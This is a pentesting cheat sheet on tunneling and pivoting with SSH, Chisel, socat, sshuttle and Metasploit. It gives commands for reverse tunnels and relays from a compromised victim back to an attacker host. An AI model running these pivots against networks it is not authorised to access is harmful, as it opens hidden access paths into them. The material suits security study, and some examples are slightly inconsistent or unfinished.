# Tunneling & Port Forwarding

- [Tunneling \& Port Forwarding](#tunneling--port-forwarding)
  - [Using SSH](#using-ssh)
    - [Local Port Forwarding](#local-port-forwarding)
    - [Remote Port Forwarding](#remote-port-forwarding)
    - [Dynamic Port Forwarding](#dynamic-port-forwarding)
  - [Using Chisel](#using-chisel)
  - [Using socat](#using-socat)
    - [Local Port forwarding](#local-port-forwarding-1)
    - [Quiet port forwarding](#quiet-port-forwarding)
  - [Using shuttle](#using-shuttle)
  - [Using Metasploit](#using-metasploit)
  - [proxychains](#proxychains)


Summary:
- Proxychains and FoxyProxy are used to access a proxy created with one of the other tools
- SSH can be used to create both port forwards, and proxies
- plink.exe is an SSH client for Windows, allowing you to create reverse SSH connections on Windows
- Socat is a good option for redirecting connections, and can be used to create port forwards in a variety of different ways
- Chisel can do the exact same thing as with SSH portforwarding/tunneling, but doesn't require SSH access on the box
- sshuttle is a nicer way to create a proxy when we have SSH access on a target

## Using SSH

### Local Port Forwarding

Local port forwarding allows you to forward a port on the local (ssh client) machine to a port on the remote (ssh server) machine, which is then forwarded to a port on the destination machine.

```bash
ssh -L <ATTACKER_PORT>:localhost:<TARGET_PORT> <USER>@<TARGET_IP>
```

### Remote Port Forwarding 

Remote port forwarding is the opposite of local port forwarding. It allows you to forward a port on the remote (ssh server) machine to a port on the local (ssh client) machine, which is then forwarded to a port on the destination machine.

```bash
ssh -R <ATTACKER_PORT>:<ATTACKER_IP>:<TARGET_PORT> <USER>@<TARGET_IP>
```

### Dynamic Port Forwarding 

Dynamic port forwarding allows you to create a socket on the local (ssh client) machine, which acts as a SOCKS proxy server. When a client connects to this port, the connection is forwarded to the remote (ssh server) machine, which is then forwarded to a dynamic port on the destination machine.

```bash
ssh -D <ATTACKER_PORT> <USER>@<TARGET_IP> -fN
```

Options:
- `f`: Requests ssh to background itself after authentication
- `N`: Tells ssh not to execute a remote command (empty command)

## Using Chisel

Chisel is a fast TCP/UDP tunnel, transported over HTTP, secured via SSH. Single executable including both client and server. Written in Go (golang). Chisel is mainly useful for passing through firewalls, though it can also be used to provide a secure endpoint into your network.

We start by starting a chisel server on the attacker that will be listening on port 8000.

```bash
# Attacker
./chisel server -p 8000 --reverse
```

On the victim, we upload chisel binary and execute it in client mode. We follow this pattern to build our command: `<local-host>:<local-port>:<remote-host>:<remote-port>`

```bash
# Victim
.\chisel.exe client 10.10.10.10:8000 R:8888:localhost:8888
```

Explaining arguments:
- **10.10.16.6:8000** : attacker IP and the chisel server port
- **R:8888:localhost:8888** : 
    - **R** : indicate that we want to listen on the remote host (attacker)
    - **8888** : open a listener on port 8888 of the attacker
    - **localhost** : all traffic are forwarded to localhost... (victim)
    - **8888** : ... on port 8888 of the victim 

This command will create a tunnel. This tunnel allows us to forward all traffic sending to port 8888 of attacker (my computer) to port 8888 of the victim.

> **Github:** https://github.com/jpillora/chisel

## Using socat

### Local Port forwarding

Connect to port <compromised_host_port> on the compromised host and have our connection directly relayed to our intended target of :<target_ip>:<target_port>.

```bash
./socat tcp-l:<compromised_host_port>,fork,reuseaddr tcp:<target_ip>:<target_port> &
```

- `fork`: put every connection into a new process
- `reuseaddr`: the port stays open after a connection is made to it

### Quiet port forwarding

```bash
# creating a local port relay on the Attacker machine
socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &

# on the compromised machine
# create a relay server 
./socat tcp:ATTACKER_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
```

You can access the target server into localhost:ATTACKING_PORT.

> **Static Binary:** https://github.com/andrew-d/static-binaries/blob/master/binaries/linux/x86_64/socat

## Using shuttle

sshuttle is a tool for creating VPN (Virtual Private Network) tunnels over ssh. It works by using ssh to forward traffic from the client machine to the server and uses iptables to configure the client machine's routing tables to direct traffic through the ssh tunnel.

```bash
# w/o private key
sshuttle -r user@172.16.0.5 172.16.0.0/24

# w/ private key
sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24
```

> **Github:** https://github.com/sshuttle/sshuttle

## Using Metasploit

First you need to get a meterpreter session. Then:

```bash
run autoroute -s <TARGET_NETWORK_IP>/24
portfwd add -L 127.0.0.1 -l 88 -p 88 -r <TARGET_IP>
```

## proxychains

double pivot - proxychains - ToDo

https://theyhack.me/Proxychains-Double-Pivoting/
